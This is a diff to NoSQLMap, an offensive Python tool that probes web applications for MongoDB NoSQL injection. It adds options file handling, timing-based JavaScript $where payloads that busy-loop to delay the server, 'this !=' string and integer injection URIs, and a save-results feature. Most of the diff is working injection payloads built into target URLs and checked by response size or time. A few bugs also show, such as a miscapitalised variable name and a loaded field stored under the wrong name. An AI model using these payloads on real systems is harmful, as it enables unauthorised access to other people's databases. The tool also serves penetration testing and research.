@@ -18,6 +18,7 @@ import sys
 import string
 import random
 import os
+import time
 import httplib2
 import urllib
 import pymongo
@@ -32,7 +33,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.09-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.1-by Russell Butturini(tcstool@gmail.com)"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -52,8 +53,7 @@ def mainMenu():
 			else:
 				raw_input("Target not set! Check options.  Press enter to continue...")
 				mainMenu()
-			
-		
+				
 		
 		elif select == "3":
 			#Check minimum required options
@@ -85,6 +85,7 @@ def options():
 		victim = "Not Set"
 	if optionSet[1] == False:
 		webPort = 80
+		optionSet[1] = True
 	if optionSet[2] == False:
 		uri = "Not Set"
 	if optionSet[3] == False:
@@ -101,11 +102,13 @@ def options():
 		print "Options"
 		print "1-Set target host/IP (Current: " + str(victim) + ")"
 		print "2-Set web app port (Current: " + str(webPort) + ")" 
-		print "3-Set URI Path (Current: " + str(uri) + ")"
+		print "3-Set App Path (Current: " + str(uri) + ")"
 		print "4-Set HTTP Request Method (GET/POST)"
 		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
 		print "6-Set shell listener port (Current: " + str(myPort) + ")"
-		print "7-Back to main menu"
+		print "7-Load options file"
+		print "8-Save options file"
+		print "9-Back to main menu"
 
 		select = raw_input("Select an option: ")
 		
@@ -161,6 +164,39 @@ def options():
 			options()
 			
 		elif select == "7":
+			loadPath = raw_input("enter file name to load: ")
+			try:
+				fo = open(loadPath,"r" )
+				csvOpt = fo.read()
+				fo.close()
+				optList = csvOpt.split(",")
+				victim = optList[0]
+				webPort = optList[1]
+				uri = optList[2]
+				httpMethod = optList[3]
+				myIp = optList[4]
+				myPort = optList[5]
+			
+				#Set option checking array based on what was loaded
+				x = 0
+				for item in optList:
+					if item != "Not Set":
+						optionSet[x] = True
+					x += 1
+			except:
+				print "Couldn't load options file!"
+			options()
+			
+		elif select == "8":
+			savePath = raw_input("Enter file name to save: ")
+			try:
+				fo = open(savePath, "wb")
+				fo.write(str(victim) + "," + str(webPort) + "," + str(uri) + "," + str(httpMethod) + "," + str(myIP) + "," + str(myPort)) 
+				fo.close()
+				print "Options file saved!"
+			except:
+				print "Couldn't save options file."
+		elif select == "9":
 			mainMenu()
 
 def netAttacks(target):
@@ -230,6 +266,9 @@ def webApps():
 	paramValue = []
 	vulnAddrs = []
 	possAddrs = []
+	appUp = False
+	strTbAttack = False
+	intTbAttack = False
 	
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -240,8 +279,16 @@ def webApps():
 		appRespCode = urllib.urlopen(appURL).getcode()
 		if appRespCode == 200:
 			normLength = int(len(urllib.urlopen(appURL).read()))
+			timeReq = urllib.urlopen(appURL)
+			start = time.time()
+			page = timeReq.read()
+			end = time.time()
+			timeReq.close()
+			timeBase = round((end - start), 3)
 			
-			print "App is up! Got response length of " + str(normLength) + ".  Starting injection test.\n"
+			
+			
+			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
 			appUp = True
 		
 		else:
@@ -267,7 +314,7 @@ def webApps():
 		if randNormDelta == 0: 
 			print "No change in response size injecting a random parameter..\n"
 		else:
-			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"
+			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
 			
 		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
 		injLen = int(len(urllib.urlopen(neqUri).read()))
@@ -276,7 +323,7 @@ def webApps():
 		randInjDelta = abs(injLen - randLength)
 		
 		if (randInjDelta >= 100) and (injLen != 0) :
-			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
+			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
 			vulnAddrs.append(neqUri)
 		
 		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
@@ -290,13 +337,13 @@ def webApps():
 			possAddrs.append(neqUri)
 		
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
-		print " Injecting " + whereStrUri
+		print "Injecting " + whereStrUri
 		
 		whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
 		whereStrDelta = abs(whereStrLen - randLength)
 		
 		if (whereStrDelta >= 100) and (whereStrLen > 0):
-			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter! Where injection works!"
+			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
 			vulnAddrs.append(whereStrUri)
 		
 		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
@@ -312,7 +359,7 @@ def webApps():
 		
 		print "\n"
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
-		print " Injecting " + whereIntUri
+		print "Injecting " + whereIntUri
 		
 		whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
 		whereIntDelta = abs(whereIntLen - randLength)
@@ -342,7 +389,7 @@ def webApps():
 		whereOneStrDelta = abs(whereOneStrLen - randLength)
 			
 		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
-			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter! Where injection works!"
+			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
 			vulnAddrs.append(whereOneStr)
 		
 		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
@@ -362,7 +409,7 @@ def webApps():
 		
 		
 		whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
-		whereOneIntDelta = abs(whereIntLen - randLength)				
+		whereOneIntDelta = abs(whereOneIntLen - randLength)				
 			
 		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
@@ -378,22 +425,162 @@ def webApps():
 		else:	
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
 			possAddrs.append(whereOneInt)
+			
+		print "\n"
+		print "Testing Mongo this not equals string escape attack for all records..."
+		print " Injecting " + strThisNeqUri
+		
+		whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
+		whereThisStrDelta = abs(whereThisStrLen - randLength)
+		
+		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
+			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(strThisNeqUri)
+		
+		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
+			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(strThisNeqUri)
+			
+		elif (WhereThisStrDelta == 0):
+			print "Random string response size and this return response size were the same. Injection did not work."
+			
+		else:	
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			possAddrs.append(strThisNeqUri)
+			
+		print "\n"
+		print "Testing Mongo this not equals integer escape attack for all records..."
+		print " Injecting " + intThisNeqUri
+		
+		whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
+		whereThisIntDelta = abs(whereThisIntLen - randLength)
+		
+		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
+			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			vulnAddrs.append(intThisNeqUri)
+		
+		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
+			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			possAddrs.append(intThisNeqUri)
+			
+		elif (whereThisIntDelta == 0):
+			print "Random string response size and this return response size were the same. Injection did not work."
+			
+		else:	
+			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			possAddrs.append(intThisNeqUri)
+			
+			
+		doTimeAttack = raw_input("Start timing based tests?")
+		
+		if doTimeAttack == "y" or doTimeAttack == "Y":
+			print "Starting Javascript string escape time based injection..."
+			start = time.time()
+			strTimeInj = urllib.urlopen(timeStrUri)
+			page = strTimeInj.read()
+			end = time.time()
+			strTimeInj.close()
+			#print str(end)
+			#print str(start)
+			strTimeDelta = (int(round((end - start), 3)) - timeBase)
+			#print str(strTimeDelta)
+			if strTimeDelta > 25:
+				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
+				strTbAttack = True
+			
+			else:
+				print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
+				strTbAttack = False
+			
+			print "Starting Javascript integer escape time based injection..."
+			start = time.time()
+			intTimeInj = urllib.urlopen(timeIntUri)
+			page = intTimeInj.read()
+			end = time.time()
+			intTimeInj.close()
+			#print str(end)
+			#print str(start)
+			intTimeDelta = (int(round((end - start), 3)) - timeBase)
+			#print str(strTimeDelta)
+			if intTimeDelta > 25:
+				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
+				intTbAttack = True
+			
+			else:
+				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
+				intTbAttack = False
 		
 		print "\n"	
 		print "Vunerable URLs:"
 		print "\n".join(vulnAddrs)
 		print "\n"
-		print ""
-		print "Possibly vulnerable URLS:"
+		print "Possibly vulnerable URLs:"
 		print"\n".join(possAddrs)
+		print "\n"
+		print "Timing based attacks:"
+		
+		if strTbAttack == True:
+			print "String attack-Successful"
+		else:
+			print "String attack-Unsuccessful"
+		if intTbAttack == True:
+			print "Integer attack-Successful"
+		else:
+			print "Integer attack-Unsuccessful"
+		
+		fileOut = raw_input("Save results to file?")
+		
+		if fileOut == "y" or fileOut == "Y":
+			savePath = raw_input("Enter output file name: ")
+			fo = open(savePath, "wb")
+			fo.write ("Vulnerable URLs:\n")
+			fo.write("\n".join(vulnAddrs))
+			fo.write("\n\n")
+			fo.write("Possibly Vulnerable URLs:\n")
+			fo.write("\n".join(possAddrs))
+			fo.write("\n")
+			fo.write("Timing based attacks:\n")
+			
+			if strTbAttack == True:
+				fo.write("String Attack-Successful\n")
+			else:
+				fo.write("String Attack-Unsuccessful\n")
+			fo.write("\n")
+			
+			if intTbAttack == True:
+				fo.write("Integer attack-Successful\n")
+			else:
+				fo.write("Integer attack-Unsuccessful\n")
+			fo.write("\n")
+			fo.close()
 		
 	raw_input("Press enter to continue...")
 	return()
 
 def randInjString(size):
-	#add more specific params (such as only letters, only numbers, etc.)
-	chars = string.ascii_letters + string.digits
-	return ''.join(random.choice(chars) for x in range(size))
+	print "What format should the random string take?"
+	print "1-Alphanumeric"
+	print "2-Letters only"
+	print "3-Numbers only"
+	print "4-Email address"
+	format = raw_input("Select an option: ")
+	
+	if format == "1":
+		chars = string.ascii_letters + string.digits
+		return ''.join(random.choice(chars) for x in range(size))
+	
+	elif format == "2":
+		chars = string.ascii_letters
+		return ''.join(random.choice(chars) for x in range(size))
+	
+	elif format == "3":
+		chars = string.digits
+		return ''.join(random.choice(chars) for x in range(size))
+	
+	elif format == "4":
+		chars = string.ascii_letters + string.digits
+		return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
+	
 
 def buildUri(origUri, randValue):
 	paramName = []
@@ -403,6 +590,11 @@ def buildUri(origUri, randValue):
 	global whereIntUri
 	global whereOneStr
 	global whereOneInt
+	global timeStrUri
+	global timeIntUri
+	global strThisNeqUri
+	global intThisNeqUri
+	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
 	split_uri = origUri.split("?")
@@ -412,16 +604,33 @@ def buildUri(origUri, randValue):
 		index = item.find("=")
 		paramName.append(item[0:index])
 		paramValue.append(item[index + 1:len(item)])
+		
+	menuItem = 1
 	print "List of parameters:"
-	print "\n".join(paramName)
+	for params in paramName:
+		print str(menuItem) + "-" + params
+		menuItem += 1
+		
 	
-	injOpt = raw_input("Which parameter should we inject?")
+	
+	try:
+		injIndex = raw_input("Which parameter should we inject? ")
+		injOpt = str(paramName[int(injIndex)-1])
+		print "Injecting the " + injOpt + " parameter..."
+	except:
+		raw_input("Something went wrong.  Press enter to return to the main menu...")
+		mainMenu()
+
 	evilUri = split_uri[0] + "?"
 	neqUri = split_uri[0] + "?"
 	whereStrUri = split_uri[0] + "?"
 	whereIntUri = split_uri[0] + "?"
 	whereOneStr = split_uri[0] + "?"
 	whereOneInt = split_uri[0] + "?"
+	timeStrUri = split_uri[0] + "?"
+	timeIntUri = split_uri[0] + "?"
+	strThisNeqUri = split_uri[0] + "?"
+	intThisNeqUri = split_uri[0] + "?"
 	x = 0
 	
 	for item in paramName:		
@@ -429,9 +638,14 @@ def buildUri(origUri, randValue):
 			evilUri += paramName[x] + "=" + randValue + "&"
 			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
 			whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-			whereIntUri += paramName[x] + "=a; return db.a.find(); var dummy=1" + "&"
+			whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
 			whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
 			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
+			timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+			timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
+			strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
+			intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+
 		else:
 			evilUri += paramName[x] + "=" + paramValue[x] + "&"
 			neqUri += paramName[x] + "=" + paramValue[x] + "&"
@@ -439,8 +653,12 @@ def buildUri(origUri, randValue):
 			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
 			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
 			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
-			
-		x += 1		
+			timeStrUri += paramName[x] + "=" + paramValue[x] + "&"
+			timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
+			strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
+			intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
+		x += 1
+		
 	#Clip the extra & off the end of the URL
 	evilUri = evilUri[:-1]
 	neqUri = neqUri[:-1]
@@ -448,6 +666,8 @@ def buildUri(origUri, randValue):
 	whereIntUri = whereIntUri[:-1]
 	whereOneStr = whereOneStr[:-1]
 	whereOneInt = whereOneInt[:-1]
+	timeStrUri = timeStrUri[:-1]
+	timeIntUri = timeIntUri[:-1]
 	
 	return evilUri
 
